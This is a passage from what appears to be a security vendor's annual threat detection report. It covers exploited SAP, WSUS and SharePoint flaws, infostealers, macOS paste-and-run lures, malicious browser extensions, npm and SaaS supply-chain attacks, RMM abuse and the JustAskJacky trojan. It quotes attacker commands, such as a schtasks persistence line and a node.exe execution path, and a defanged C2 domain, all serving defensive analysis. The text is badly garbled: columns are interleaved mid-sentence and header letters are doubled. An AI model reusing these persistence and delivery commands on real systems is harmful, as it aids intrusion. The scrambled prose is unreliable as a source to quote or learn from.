In reviewing post-exploitation activity, Red Canary observed Python reverse shell code spawning from known SAP processes in addition to the manipulation of web shell files followed by the download and execution of additional tools. In these scenarios, the adversaries used Base64-encoded commands to evade observation with process-monitoring tools.

To fix the vulnerability, SAP released a security advisory in May 2025 visible to customers of their support portal with additional guidance to patch affected components.

#### CVE-2025-59287
A critical RCE vulnerability in Microsoft’s Windows Server Update Service (WSUS) was patched in an out-of-band update in October 2025. Researchers reported shortly after the update that adversaries were actively targeting publicly exposed WSUS endpoints on default ports 8530/TCP and 8531/TCP and sending crafted requests that triggered a deserialization RCE. This led to PowerShell and Windows Command Shell executing Base64-encoded commands designed to enumerate user and network information related to the affected endpoint. Afterwards, the results of the extracted information were sent to a remote webhook URL.

#### CVE-2025-53770 & CVE-2025-53771
These vulnerabilities allow for unauthenticated remote code execution on a Microsoft SharePoint server, specifically on-premise versions of SharePoint Server, including SharePoint 2016 and 2019. By exploiting the vulnerabilities, an adversary may send serialized objects to the SharePoint server, causing arbitrary code to execute actions such as writing web shells, spawning PowerShell commands, and more.

In July 2025, the U.S. Cybersecurity and Infrastructure Security Agency (CISA) and other community members reported widespread exploitation of the vulnerabilities. Later, Microsoft released customer guidance, including tactics, techniques, and procedures (TTPs), indicators of compromise (IOCs), and mitigation techniques for the vulnerabilities to further harden SharePoint servers against exploitation.

---

of unusual requests to a page at
/ _
in very large environments. .
layouts/*/spinstall0.aspx

22002266 TTHHRREEAATT DDEETTEECCTTIIOONN RREEPPOORRTT 2277
Stealers
Driven in part by malware-as-a-service stealers like LummaC2
and Rhadamanthys, stealer activity surged in 2025, targeting both
Windows and Mac systems and often using paste-and-run lures.
Stealers are a type of malware that are, as to different behaviors and inconsistent detections
the name suggests, designed to steal data from in both the endpoint and network realms.
victim systems. They are popular with adversaries
because they offer a number of highly useful Stealers in 2025
capabilities in a single payload. Also known as
information stealers or infostealers, this type of
malware is not new; stealers have been in use for In 2025, Red Canary saw stealer use continue
many years. The most frequently cited example to increase across both macOS and Windows
of the first popular modern infostealer is Zeus (aka systems.
ZeuS, Zbot Trojan), first reported in 2007. Initially
designed to access banking information and Two Windows stealers made our top 10 list for the
user credentials, Zeus and its variants evolved, year: LummaC2 in 5th and Rhadamanthys in 10th.
introducing capabilities that today’s stealers Both LummaC2 and Rhadamanthys are offered
still include. Subsequent popular stealer families as malware-as-a-service (MaaS), making them
include Vidar, Raccoon, StealC, Redline, and purchasable and easily accessible by adversaries
many others. with a low level of skill or sophistication. Stealers
have been a popular MaaS offering for many
Modern stealers can extract information from years, which enables their widespread use.
web browsers, applications, cryptocurrency
wallets, and more. Credentials are the primary It is worth noting that LummaC2 and Rhadamanthys
commodity that stealers capture, and adversaries infrastructure was targeted in multiple phases of
can sell them in online marketplaces, share them Operation Endgame this year, which at the end of
with other adversaries, or use them in the service 2025 appeared to have been successful in greatly
of a more complex scheme like ransomware reducing operations for these stealers.
or extortion.
Over the course of 2025, five additional stealers
Stealers frequently have built-in capabilities made it onto our monthly top 10 list in our
to not only query and access sensitive information, Intelligence Insights:
but also package and send the data to adversary-
controlled resources like command-and-control • ArechClient2
(C2) infrastructure, sites like Pastebin, and • Atomic Stealer
so forth. • Poseidon
• Odyssey
Some stealers, particularly those with • MacSync
modular and customizable features, can also
create persistence, use evasion tactics, and even Atomic Stealer, Poseidon, Odyssey, and MacSync
leverage victim systems as a botnet to facilitate are all designed to target macOS. You can read
ongoing operations. The customizable features more about these stealers in the Mac malware
can drastically affect the detectable footprint for trends section, as well as on the Red Canary blog.
the malware, with differing configurations leading

2026 THREAT DETECTION REPORT 28
Stealer delivery and distribution The vast majority of attempted LummaC2 delivery
that we saw leveraged malicious copy and paste
Adversaries hoping to deliver stealers to techniques, as did campaigns delivering macOS-
unsuspecting victims can use a variety of targeted stealers. Paste-and-run lures commonly
methods for distribution, including: deliver a loader or crypter that then goes on to
drop a stealer. Several other threats we saw in
• phishing campaigns high volume this year were involved in this stealer
• compromised websites delivery ecosystem, including:
• cracked software
• malvertising • HijackLoader
• MintsLoader
One extremely popular vehicle for stealers in 2025 • CypherIT
was paste and run, aka ClickFix/fakeCAPTCHA.
Take action
Visit the Stealers trend page for detection Nearly every organization is likely to encounter
opportunities and relevant atomic tests to validate a stealer at some point, so it’s important to build
your coverage. a response plan before you need it. An excellent
playbook would include determining what account
Because stealers are opportunistic and widely details are stored in the software on an affected
distributed in many ways, general preventative system, including:
measures that apply to multiple malware families
also help fight against stealers: • browsers
• file transfer software like FileZilla and WinSCP
• Provide safe software installation sources • Telegram messaging
for users. • Steam gaming
• Configure ad-blocking tools where possible. • cryptocurrency wallets
• Deploy endpoint security controls for detection • VPN profiles
and protection. • cloud credentials in CLI tool configuration
• sensitive files stored in the user’s Desktop and
Documents folders
Once you determine the scope of data theft,
take steps to reset any credentials stored on
the system. This may also involve manually
revoking sessions to prevent cookie reuse. Finally,
if financial details such as payment cards or
cryptocurrency wallets are stored on the affected
system, users may need to monitor the relevant
accounts for unauthorized transactions.

22002266 TTHHRREEAATT DDEETTEECCTTIIOONN RREEPPOORRTT 2299
Mac malware
Entrenched within enterprises, macOS systems now face similar threats to Windows systems.
If your organization has software engineers Paste and run to
or graphic designers, you’ve likely already
managed macOS systems for quite some evade Gatekeeper
time. Throughout 2025, we spoke to several
organizations that wanted to prepare as some
Gatekeeper is awesome at preventing non-
areas of their companies sought to use macOS
notarized apps from executing on macOS, but
systems instead of Windows for a variety of
what if the malware doesn’t need to execute from
reasons. As more employees switch to Macs,
an app? This is the exact path that adversaries
the macOS-specific attack surface for your
took in 2025. Astute readers of previous Threat
organization expands, requiring a new tailored
Detection Reports may remember that Apple
approach to defense.
slowed down stealer execution in September 2024
by taking a well-known bypass out of Gatekeeper.
macOS threats in 2025 As a result, adversaries began exploring how they
could distribute malware in script form to evade
macOS default controls Gatekeeper entirely.
Just like Windows, macOS has some default This experimentation and evolution took place
security controls to protect against malware as paste-and-run initial access methods
execution. Apple’s platform security were already popular on Windows. Adversaries
documentation shows that macOS default began using those same paste-and-run
controls are made up of Gatekeeper, Notarization, methods on macOS, replacing PowerShell with
and XProtect. Gatekeeper requires any apps that a combination of shell script and AppleScript
execute on macOS be notarized, which in turn code. Unfortunately, this worked rather well, as
requires the app developer to submit it to Apple many macOS users were already familiar with
for scanning (but not a full code review). For folks performing commands to download
curl | bash
working in Windows, this is similar to the Windows and install software. Once the fateful paste
App Certification that is required for apps in the into a Terminal window took place, the
Microsoft Store. traditional AppleScript stealer code we’ve
observed in previous years executed to
While Gatekeeper and Notarization are imperfect, gather data and exfiltrate.
Apple has taken steps to keep those controls
resilient against bypasses and abuse. An excellent Mac stealer families
example of this is the patching of a Gatekeeper
bypass in late 2024 that was simple enough that by the numbers
adversaries could coach users through executing.
Atomic Stealer remained popular this year, even
Finally, XProtect is the anti-malware control for
as Poseidon rebranded as Odyssey Stealer and
macOS, similar to Windows Defender. And just
resumed distribution to become the second most
like with Defender, Apple periodically updates
popular. Towards the end of 2025, we began to
signatures for XProtect to find and remediate
malware families. observe three additional newcomers to the macOS
stealer market: MacSync Stealer, Phexia, and
DigitStealer.

2026 THREAT DETECTION REPORT 30
MAC STEALER FAMILIES OBSERVED THROUGHOUT 2025
Of the stealer families we
observed, Atomic Stealer
was the most popular, while
Odyssey and MacSync stealers
both achieved similar popularity.
Phexia and DigitStealer were
the least common, potentially
indicating they weren’t as
widely distributed.
For time distribution, ATOMIC AND ODYSSEY STEALER ACTIVITY THROUGHOUT 2025
Atomic and Odyssey Stealers
were commonly distributed
throughout the year, while
MacSync Stealer and Phexia
appeared only at the end
of 2025.
Check out
MACSYNC AND PHEXIA STEALER ACTIVITY THROUGHOUT 2025
our blog on
distinguishing
Atomic,
Odyssey,
and Poseidon
stealers
on macOS.
Read the blog

2026 THREAT DETECTION REPORT 31
Just a little bit of BeaverTail
In addition to the usual legion of stealers, we also observed BeaverTail malware executing on macOS
in 2025. BeaverTail relies on social engineering techniques for initial access, with lures posing as job
interviews or programming tasks distributed through gig work sites.
In the cases we observed late in 2025, the BeaverTail instances we observed matched activity
reported by NVISO.
Take action
Visit the Mac malware trend page for detection Starting with version 2025.8, Santa can use
opportunities and relevant atomic tests to validate Common Expression Language (CEL) rules
your coverage. to block specific instances of process and
command-line combinations from executing.
macOS devices should have comprehensive Visit the Mac malware page on the Threat
protections in place, including antimalware Detection Report website for example rules
and EDR tools. Without visibility, detection and and code snippets.
response is much more difficult. To explore what
telemetry data is possible to gather, check out the Additional mitigations here are the same for any
free Mac Monitor tool. other stealer families, providing safe software
sources and a robust response plan. For macOS-
Must be Santa specific actions, consider further educating
users on TCC controls in macOS and presenting
We’ve also seen some organizations use Santa scenarios when users may not want to bypass
for macOS for application control. Santa can TCC to preserve their own security and privacy.
be complicated to configure and deploy, but
recent developments in 2025 show that the tool is For endpoints where a stealer has run, consider
becoming more useful in behavior-based blocking. resetting all TCC permissions so they will re-fire
in the future even if a user approves access by
executing .
sudo tccutil reset All

22002266 TTHHRREEAATT DDEETTEECCTTIIOONN RREEPPOORRTT 3322
Browser threats
Compromised and malicious browser extensions are expanding the attack
surface and increasing data exposure risks for organizations.
Browser extensions—such as Dark Reader Malicious browser
for reduced eye strain, uBlock Origin for ad
extensions in 2025
blocking, and 1Password for seamless password
management—undeniably enhance a browser’s
native functionality. However, these small
The threat of malicious browser extensions is
programs, while boosting in-browser productivity,
not new, with reports dating back to the early
pose a significant and often overlooked risk.
2010s. However, 2025 saw a noticeable surge
Their widespread adoption dramatically expands
in malicious extensions uploaded to browser
an organization’s attack surface, operating in
marketplaces. Adversaries exploited a perfect
a security gray area that existing tools struggle
storm of vulnerabilities: misplaced user trust in
to monitor.
the marketplaces, weak organizational oversight,
relaxed extension review processes, and
This is particularly concerning because most
the ease of acquisition—either directly or
EDR tools are blind to the activities of extensions
through sophisticated supply chain attacks
operating inside the browser. This critical visibility
compromising reputable ones. These methods
gap is compounded by the fact that many
allowed adversaries to silently install malware
organizations simply don’t know which extensions
on millions of user devices.
are even installed across their fleet. Essentially,
browser extensions gain deep, unmonitored
The browser extension ecosystem is an attractive
access to sensitive user and organizational data,
target for several distinct reasons:
often completely unbeknownst to security teams.
In 2025 alone, adversaries used malicious browser An extension is
extensions to steal active session cookies and fundamentally manipulable
Users implicitly trust code that adversaries can
cryptocurrency, spy on users browsing activities, their browser and use to exfiltrate cookies,
its built-in extension dynamically change
hijack users’ browsers, and even remotely execute
marketplace. functionality via remote
code on victims’ machines. Millions of users were code execution, or hijack
users’ searches.
directly impacted by the breadth of malicious
Chrome extensions uploaded to the Chrome Web
Store in 2025.
The default
auto-updating mechanism
Organizations typically
The pervasive and severe nature of these attacks of most browsers ensures
lack effective processes
extensions stay current
underscores the urgency for action. Therefore, without user interaction, for managing, reviewing,
approving, or tracking
security professionals must immediately and allowing adversaries to extensions.
rapidly deploy malicious
proactively take definitive control of browser code to a massive user base.
and extension management. This critical step
is absolutely essential to safeguard users and
protect the organization’s sensitive data living
within the browser. Traditional endpoint Since monetizing extensions
monitoring tools is often difficult, legitimate
fundamentally developers can be tempted
lack visibility into to silently sell and transfer
extension activity ownership to interested, and
within the browser. often malicious, buyers.

2026 THREAT DETECTION REPORT 33
Precursor: The The adversary behind the Cyberhaven incident
added a new content script to the extension:
Cyberhaven supply . This script was configured to
content.js
run as soon as the page loads (
“run _ at”:
chain attack
) and its primary purpose was
“document _ start”
to exfiltrate users’ Facebook session cookies and
The scale of this threat was chillingly authentication tokens, sending that information to
the adversary’s command and control server.
foreshadowed in December 2024 by a supply
chain attack targeting Chrome extension
developers. This campaign led to the compromise
This event set the stage for
of 35 Chrome extensions, ultimately impacting
the year ahead, as reports
over 2.6 million users, with the Cyberhaven of dangerous extensions
surged to more than 200
extension being a notable casualty.
throughout 2025, according
to this Spin.AI tracker.
The attack began with a deceptive email leading
developers to a legitimate Google login page,
which then fraudulently requested authorization The year concluded with two eye-opening
incidents that serve as critical warnings.
for a malicious Google OAuth application
named “Privacy Policy Extension.” Crucially,
Phantom Shuttle
this application sought the
https://www.
scope.
googleapis.com/auth/chromewebstore One incident involved two extensions, both
Once the adversary-controlled app was granted
named Phantom Shuttle, available in the Chrome
permissions, the attacker was able to publish
Web Store (one since 2017, the other since 2023).
a malicious version of Cyberhaven’s extension,
On December 22, 2025, security researchers
version 24.10.4, to the Chrome Web Store. publicly disclosed a malicious version update
(version 3.1.9, released December 15, 2025).
While originally masquerading as VPNs, deeper
Primer: Anatomy of a browser
code analysis revealed the extensions’ true
extension
intent: secretly stealing credentials from over
170 platforms. The targeted platforms would
As a quick primer, a browser extension is
create a lateral-movement nightmare for any
typically composed of HTML, CSS, and
modern organization.
JavaScript, and the package of a browser
extension contains a manifest file in its root
Prominent targets included developer tools
directory that lists important information about (GitHub, Stack Overflow, Docker, npm), cloud
the structure and behavior of the extension. services (AWS, Digital Ocean, Azure), corporate
platforms (Cisco, VMware), and social media/adult
content sites—the latter potentially being used for
blackmail.
Trust Wallet
A second major incident was a supply chain
attack in December, targeting the Trust Wallet
Chrome extension and resulting in the theft of an
estimated $7 million USD in cryptocurrency.
Visit the web version of the
report to see an example of These cases demonstrate that seemingly
the manifest file. benign or legitimate browser extensions can be
weaponized with startling speed and capability.
This proves that Chrome extensions pose a
significant, active risk to organizations rather
than a merely passive one.

2026 THREAT DETECTION REPORT 34
Take action
Visit the Browser threats trend page for Version pinning
detection opportunities and relevant atomic tests
to validate your coverage. This option is a bit of a double-edged sword.
Ideally, you’d want to ensure extensions stay
Fortunately, the common browsers found in an up to date across the enterprise to receive new
enterprise are Google Chrome, Microsoft Edge, features and, most importantly, security patches.
and Mozilla Firefox, all of which can be managed However, when an extension is updated with
across Windows, Linux, and macOS devices using net-new unvetted code, there is potential for that
tools like Group Policy, MDM solutions (e.g., Jamf), code to be malicious, either because an adversary
or the Google Admin console. This centralized compromised the extension developer’s account
management offers opportunities to mitigate the or the developer themselves turned the
threat of malicious browser extensions, which extension malicious.
primarily relies on two factors: users being able
to install extensions at will and extensions auto- Pinning the versions of the extensions in your
updating with new, unreviewed code. environment allows administrators to re-vet the
extension’s code and ensure that requested
permissions and scripts have not changed in
Prevention and mitigation
a way that introduces undesired security and
privacy risks.
To prevent users from introducing unvetted
browser extensions and to control the auto-
updating of sanctioned extensions, there are Response/remediation
three primary mitigation options.
If a malicious or risky browser extension is
Only allow managed browsers detected in your environment, use its ID to
uninstall and block it through your management
This option enforces that users only utilize options. The extension should only be re-added
browsers that are managed. This prevents the to the allowlist if there is a persistent business
installation and use of unmanaged browsers, requirement, and only after the extension authors
ensuring that organizational policies designed for have both provided a public statement explaining
protection cannot be easily circumvented. the compromise and released an update that
eliminates the malicious code. Following such,
Allowlist consider also pinning the extension version.
This option restricts users from installing any If the browser is unmanaged and a malicious
browser extensions not on the organization’s extension was discovered via threat hunting, your
allowlist. This requires users to request an response team should direct all affected users to
extension be added, allowing administrators uninstall the extension from their browser.
to vet the extension before it’s used in the
environment. This method offers the highest Uninstallation procedures are available for:
level of security without completely blocking
extensions for users, ensuring they still have a • Google Chrome
path forward for tools that offer real utility, • Microsoft Edge
without overt or hidden malicious intent. • Mozilla Firefox

22002266 TTHHRREEAATT DDEETTEECCTTIIOONN RREEPPOORRTT 3355
Supply chain compromises
No organization is immune to supply chain compromises, but several incidents
in 2025 gave insight into how to minimize your risk.
Several widespread supply chain incidents in 2025 demonstrated how quickly a single compromise can
have widespread downstream effects. Although every organization faces different risks from supply
chain compromises depending on the hardware and software they use and develop, these compromises
should be top of mind for defenders due to the challenges of preventing them. Solid plans to detect these
compromises and quickly respond to them are key for reducing risk since prevention is often out of your
organization’s control.
Supply chain compromises in 2025
While many supply chain compromise trends have remained stable in recent years, 2025 highlighted just
how easily an adversary can compromise large numbers of organizations by choosing a well-connected
target. Software supply chain compromises were far more common and impactful in 2025 as opposed to
hardware compromises, so we will focus on that trend since it is more accessible for most defenders. It may
be helpful to think about software supply chain risks in three main categories:
This category is the most common one people think of with supply chain compromises, and for
good reason—much of the software you use is deeply embedded into your operations. When
1 considering this software, it’s important to consider both on-premise and cloud-hosted, as well
as services delivered through software.
Example compromise: SolarWinds (2020)
This category represents risk presented by the software your vendors are using, since if they get
compromised, that puts you at risk. This area presents a nearly-impossible risk to mitigate, as every
2 organization has to accept that they simply do not know all of the software their vendors use. To
help address this risk, you simply must trust that your vendors are doing a good job securing their
environment and mitigating risk from their own supply chain.
Example compromise: Salesloft Drift (2025)
This comprises all code and dependencies an organization uses to build their own software. All
organizations that build software—either for themselves or for others—need to pay close attention
to supply chain threats, as CI/CD pipelines and developer workflows represent an appealing target.
This is particularly appealing to adversaries because it is often challenging to monitor CI/CD
3 pipelines, and also because if they are able to compromise software in one organization, it may
present an opportunity to compromise many more. Software also commonly uses open source
code, which has a large number of dependencies and compounds the risk further.
Example compromise: Shai-Hulud (2025)

2026 THREAT DETECTION REPORT 36
Npm compromises: Shai-Hulud worms The “Sha1-Hulud: The Second Coming”
through victims campaign in November 2025 involved a similar
npm package worm. Collectively, these two
campaigns wreaked havoc across the community,
Campaigns to steal maintainers’ credentials and
impacting hundreds of organizations. Part two
effectively poison the software supply chain—
of Shai-Hulud was so prevalent that it ranked as
along with countless downstream applications
Red Canary’s #2 threat for November 2025,
and users—made headlines throughout 2025,
a greater impact than any other supply chain
particularly through npm package compromises.
compromise we observed in 2025.
The prevalence of npm package incidents,
particularly the widespread Shai-Hulud
campaigns, is a reminder that threats targeting
SaaS compromises: Adversaries drift
software development supply chains can have
away from Salesloft Drift
significant and widespread impact, particularly
within widely used open source ecosystems.
In August 2025, Salesloft Drift was compromised.
Salesloft Drift is the chat software many
Short for “node package manager,” npm is the
companies use on their websites to talk to
default package manager for , which is
Node.js
visitors. Many companies send data from Drift
one of the most common ways that JavaScript
to Salesforce (a central database for sales) so
runs on servers. Npm packages are self-
that any interactions automatically show up in
contained units of code that developers can easily
customer records. During the compromise of
incorporate into their projects—think of package
Salesloft, the group UNC6395 stole valid OAuth
managers like “app stores” for developers (instead
authentication tokens, allowing them to bypass
of for phone users) and packages like the apps.
standard security barriers such as MFA, and log in
to any SaaS applications that an organization had
Npm packages help developers quickly build
connected through Drift.
software, but they have drawbacks, as we saw
in widespread incidents. A single compromised
The adversaries primarily targeted and stole
package can ripple through countless projects
Salesforce data accessed through the Salesforce
that depend on it because developers trust
Salesloft integration, and in some cases also
these packages.
compromised connected Google Workspace
instances. UNC6395 was able to export sales
While there were multiple npm package
data from hundreds of organizations.
compromises throughout 2025, the one with the
(Disclosure: Red Canary parent company
greatest impact based on our visibility was Shai-
Zscaler was impacted by this incident.) Even
Hulud. Leveraging a worm named by the actors
organizations with strong defenses were impacted
who created it, the campaign targeted credentials
by this, as they necessarily relied on Drift.
as well as GitHub and cloud tokens to infect
additional packages.
While the Drift compromise wasn’t disclosed
until late August, Red Canary was able to detect
The first round of the campaign occurred in
activity related to it almost a month earlier.
September 2025, when an adversary published
We did this by doing what we recommend all
malicious packages to the npm package
Node.js
organizations do: continuously analyzing threat
registry. The malicious packages contained
intelligence about adversary behaviors and
functionality to search an affected host’s
proactively developing detection analytics to
filesystem to find secrets such as cloud access
catch them.
keys and exfiltrate the secrets to public GitHub
repos named “Shai-Hulud.”
In July 2025, one of our threat hunters found
reporting on adversaries abusing TruffleHog,
Notably, the malicious components replicate to
which is also used by security and development
other npm packages if the associated tokens
teams to search for secrets. They worked with
are found, publishing a new malicious version of
our detection engineering team to perform
the npm package. As this malware contains a
several hunts for the tool and develop
self-replicating, or “worming,” component, many
high-fidelity analytics.
different npm packages were affected.

2026 THREAT DETECTION REPORT 37
Less than a month after the analytic’s
deployment, it identified TruffleHog
conducting reconnaissance API calls in
a customer environment. Our analysis showed Check out our blog
the adversary leveraged a compromised IAM user
breaking down the
identity associated with a TruffleHog user agent to
execute the AWS API call. Salesloft Drift activity
GetCallerIdentity
we detected months
We quickly made contact with the customer to
before the compromise
scope and contain the activity. Later, during a
post-incident meeting, the customer confirmed was made public.
that this activity was related to the Salesloft Drift
supply chain attack. This underscores that diligent
attention to adversary techniques can enable
defenders to uncover supply chain compromises
before they come to light. Read the blog
Take action
Visit the Supply chain compromise trend page
for testing and detection guidance, including the
detection analytic that helped us surface activity
related to the Salesloft Drift compromise before it
was disclosed.
To mitigate impact from npm compromises,
apply OWASP’s npm security best practices.
Among these recommendations are security
strategies such as ensuring two-factor
authentication (2FA) is enabled for any accounts
with publishing rights to the npm package
repository and using a local npm proxy to cache
known good npm packages for use internally.
This caching strategy can be combined with a
“cooldown check” to avoid using packages
less than a day old.

22002266 TTHHRREEAATT DDEETTEECCTTIIOONN RREEPPOORRTT 3388
Remote monitoring and
management (RMM) tools
In 2025, Red Canary observed RMM tools as the ultimate payload in
an increasing number of campaigns, including web-based phishing.
RMM tools are readily available, often free, highly Even when an adversary abuses an unpermitted
reliable, and easy to use. Once an adversary RMM tool, organizations may be slow to respond
installs one on a compromised system, they have or reluctant to block its use outright for fear that
access to a professional-grade administration they may hinder a legitimate business use case.
platform that may seem benign and boasts a
rich array of tools and features, including the RMM tool abuse in 2025
command line, the desktop’s user interface, and
access to any files on the system.
While adversary abuse of RMM tools has been
Many security operation centers (SOCs) consider commonplace for years, they increasingly became
unapproved RMM tools operating in their the payload of choice among financially motivated
environment a symptom of "shadow IT" and only attackers and ransomware affiliates in 2025.
a minimal cause for concern. However, we know Popular tool NetSupport Manager climbed
from experience that ransomware crews, state- from number 7 on our 10 threat list to number
funded adversaries, and all variety of financially 4 this year.
motivated threats routinely abuse RMM tools.
In September 2025, Red Canary Intelligence and
RMM tools afford an adversary a few key Zscaler threat hunters published collaborative
advantages over traditional malware: research on multiple web-based phishing
campaigns dropping the RMM tools ITarian (aka
• They are easy to use by design and purpose- Comodo), PDQ, SimpleHelp, and Atera.
built for remote interaction.
• They work without the pesky effort of having Observed lures included:
to code anything yourself, allowing things like
persistence to simply become a checkbox. • fake browser updates
• They are signed, allowing them to evade • meeting invitations
controls or alerts that might expect malicious • party invitations
binaries to be unsigned. • fake government forms
Additionally, the traffic generated by many Red Canary has also observed multiple adversaries
RMM tools flows through infrastructure and utilizing two RMM tools in quick succession, likely
domains owned by companies that develop to establish multiple methods of persistent access.
and maintain them, which is unlikely to be flagged
as suspicious and may blend in with routine,
benign network traffic. If an adversary is lucky
or has done their homework, they can complicate
detection immensely by abusing an RMM tool
that is permitted within an organization.

2026 THREAT DETECTION REPORT 39
A growing list of options for adversaries
Red Canary detected adversaries abusing the
Check out our joint following RMMs in 2025:
research with Zscaler
• Action1
on phishing campaigns • Chrome Remote Desktop
• ConnectWise ScreenConnect
dropping RMM tools.
• Datto/CentraStage
• GoRelo
• GotoHTTP
• ITAgent
Read the blog
• Itarian
• Level
• LogMeIn Resolve
• N-Able N-Sight
• NetSupport Manager
• PDQ Connect
• SimpleHelp
Developers fight back • Syncro
• Velociraptor
Combating the problem is tricky given the wide
The presence of any of these tools on their own—
variety of RMMs available and the differing
or any other RMM tool for that matter—isn’t
attitudes of the companies who develop them.
necessarily malicious. Unless you adhere to strict
Some deny, downplay, or ignore malicious use of
allowlist/blocklist policies, which is easier said
their tools. Others are receptive to feedback and
than done, there may be no action to take on these
work with the community to fortify their products
tools until an adversary starts performing overtly
against abuse.
malicious activity. The difficulty of getting tools
like these under control can be exacerbated in
For example, LogMeInResolve took action
environments with existing local administrative
with their installer logic to flag instances where
rights that give normal users the ability to freely
adversaries have renamed an RMM installer,
install RMM tools, which becomes even more
hopefully causing users to think twice before
problematic when you’re being targeted by a
installing a renamed RMM (a common hallmark
sophisticated adversary. However, a robust
of RMM abuse).
allowlist/blocklist policy is probably the first
and most important step toward getting a handle
on the types of applications permitted within
your environment.
In the absence of strict application controls (and
in the hands of a skilled adversary), RMM tools can
bypass some of an organization’s most reliable
detection logic because adversaries are typically
hands-on-keyboard with RMM tools and able
to modify their behaviors so they blend in with
ScreenConnect, PDQ, and Velociraptor day-to-day administrator activity. Emerging as
have also taken steps to help mitigate abuse a simple download from a seemingly innocuous
of their tools. user, RMM activity surfaces little behavior other
than binary signatures to tip off defenders,
However, since there are so many RMM tools out giving adversaries an initial foothold within an
there, when a developer makes it more difficult to environment and ample time to pivot quickly within
abuse their particular tool, adversaries can simply interactive sessions before too many eyes have
adopt a new one. started investigating their behavior.

2026 THREAT DETECTION REPORT 40
Take action
Visit the RMM tools trend page for detection Allow/blocklist policies
guidance and relevant atomic tests.
The best generic advice for mitigating the risk
Establish your baseline posed by these tools is to create robust allow/
blocklist policies and strictly adhere to them.
Understanding what’s running in your environment Depending on your environment, one or more of
and what is sanctioned in your environment is a these utilities may be permitted for use, so before
crucial first step in protecting against RMM abuse. you go down the road of detection on these
You can profile your environment using free tools utilities, we recommend adopting an effective
like Surveyor to get a better understanding of inventory management tool to identify any
what, if any, RMM tools are being used. You may shadow utilities that may be lurking in your
find legit users leveraging wanted and unwanted environment before you start trying to detect
RMMs alike, but you might also find outright these one at a time.
malicious use of approved or unapproved RMMs
for post-exploit activity by adversaries. Surveyor has a definitions file that you can use to
search for the presence of many of the tools listed
Application controls in this section using a supported EDR tool.
If your organization has RMM tools that are Understanding what’s permitted in your
approved for use, you can use application environment and being able to survey your
controls to block the execution of any RMM tools environment for what’s actually installed is
that aren’t approved. Rooting out malicious or critical. When you find unpermitted software
suspicious use of sanctioned RMM tools is tricky installed, response actions will depend on
and reliant on active monitoring, behavioral organization-specific security policies.
detection, and policy enforcement.
Response
Know what to look for
Most remote access tools set up persistence
Having the ability to collect and inspect
binary signature metadata and binary naming using a service; you can usually remove the
conventions and understanding common and access by simply uninstalling them as you would
uncommon installation paths for RMM tools are any other application. However, an adversary
the basic prerequisites for developing an effective may remove the “uninstall” option. When or
RMM detection strategy. Of course, the sheer if that is the case, you will need to delete the
volume of RMM tools available to adversaries, service, stop the process, and then delete the
let alone abused by them, renders confident corresponding executables.
detection coverage a tall order.
Many remote access tools will log their own
activity, so if you have the time, expertise, and
resources available, consider reviewing these logs
to get a more detailed picture of the actions they
performed, including installing secondary RMM,
an increasingly common tactic.

22002266 TTHHRREEAATT DDEETTEECCTTIIOONN RREEPPOORRTT 4411
The following chart illustrates the specific threats What’s included in this section
Red Canary detected most frequently across
our customer environments in 2025. We ranked This PDF spotlights the six threats making their
these threats by the percentage of customer debuts in the Threat Detection Report, covering
organizations affected to prevent a single, analysis of relevant, novel, or changing threat
major security event from skewing the metrics. tradecraft and advice for mitigating the effects of
We excluded threat detections associated with the threat. You can view the full analysis of all of
confirmed testing. the top 10 threats—including detection and testing
guidance—in the web version of this report.
As discussed in our Methodology section,
we chose to define “threats” broadly as malware,
tools, threat groups, or activity clusters—in short, In addition to the top 10, read our analysis
any suspicious or malicious activity that represents of featured threat CleanUpLoader, as well
a risk to you or your organization. as our field guide to the other threat clusters
that our Intelligence team is tracking.
TOP 10 THREATS DETECTED IN 2025

22002266 TTHHRREEAATT DDEETTEECCTTIIOONN RREEPPOORRTT 4422
#2 OVERALL
RANK
JustAskJacky
7.4% CUSTOMERS
Using several names and lures, JustAskJacky is a AFFECTED
working AI chatbot with hidden functionality and
mysterious goals.
Analysis the family of malware that we collectively call
JustAskJacky. PDF and manual filename lures are
not exclusive to JustAskJacky, nor is the use of
JustAskJacky appeared on the scene halfway
for malicious code. This can complicate
through 2025, though Red Canary found related Node.js
distinguishing these threats without doing a little
samples going back to December 2024 under other
digging into the malicious code.
lure names. This software is typically introduced as
a seemingly legitimate AI tool or utility application
that has additional functionality allowing it to
remotely execute encoded commands. Like a true
AI “helper” theme
trojan horse, JustAskJacky is deceptive in the
sense it actually does what it claims to do; users
GoAskBobby.exe
can interact with the downloaded AI tool/utility,
and it will return results. CheckWithGilbert.exe
JustAskJacky.exe
Despite its remote execution functionality, AskBettyHow.exe
Red Canary has not observed follow-on
activity to the initial installer aside from several
reconnaissance commands, which likely allow the
Manual themes
adversaries to choose victims for the next stages
of the intrusion chain.
allmanualsreader.exe
JustAskJacky was one of several trojans using bestusermanual.exe
that made headlines during June manualshq.exe
Node.js
and July 2025, leading to some confusion with manualreaderpro.exe
another threat in our top 10: Tampered Chef. openmymanual.exe
Our malware analysis identified these as distinct
threats because we found no overlap in
JavaScript files or file signers. Misc.
classicsudoku.exe
Jacky introduces some new friends
Turbofixpdf.exe
Over the past year, JustAskJacky expanded to
include some AI helper friends (Betty, Bobby, and
Gilbert) as well as offered help to those looking Due to the nature of the lure names and the
for product manuals online. In fact, we’ve been distribution method, we assess JustAskJacky to
tracking over a dozen different lure names under be a threat of opportunity. We saw it widespread
across industries in our customer base.

2026 THREAT DETECTION REPORT 43
Malware details JUSTASKJACKY EXECUTION CHAIN
The initial file download is a signed InnoSetup
installer and regardless of the actual lure name
or purported functionality, the code has the
same behavior:
• attempts to execute a JavaScript
node.exe
file in an unusual directory. The directory often
matches the installer lure name, and the JS file
uses a GUID-like filename.
For example:
cmd.exe node.exe C:\Users\
username\AppData\Local\Programs
ManualReaderPro\24c92c24-5c4e-451a-8885-
9509dc69ab38.js
• The installer creates a scheduled task for
persistence by importing a task XML file that
will execute with the JavaScript file
node.exe
as a parameter.
For example:
cmd.exe /C schtasks /
Create /tn “24c92c24-5c4e-451a-8885-
9509dc69ab38” /xml “C:\users\username\
AppData\Local\Temp\is-ULLR6.tmp\task.
xml”
• queries the MachineGUID and
node.exe
OS version of the system and sends that
information to a remote command-and-control
(C2) framework. The C2 infrastructure is often
hosted via dynamic DNS and may appear like
a domain generation algorithm (DGA) domain,
such as .
api.cjby76nlcynrc4jvrb[.]com
• The GUID-named JS file is obfuscated with
Obfuscater.io, a JavaScript obfuscator that
allows people to upload code for obfuscation
on their website.
• After deobfuscation, the code reveals it can
receive Base64 and XOR-encoded JavaScript
